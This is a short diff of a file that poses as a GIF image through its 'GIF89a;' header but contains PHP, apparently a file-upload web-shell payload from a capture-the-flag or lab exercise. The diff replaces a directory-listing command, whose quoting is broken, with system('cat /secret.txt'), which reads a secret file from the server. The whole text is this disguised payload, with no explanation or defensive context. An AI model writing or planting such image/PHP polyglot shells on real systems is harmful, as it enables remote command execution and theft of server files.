@@ -2,6 +2,6 @@ GIF89a;
 
 <?php
 
-system('ls | grep 'cbj'')
+system('cat /secret.txt');
 
 ?>
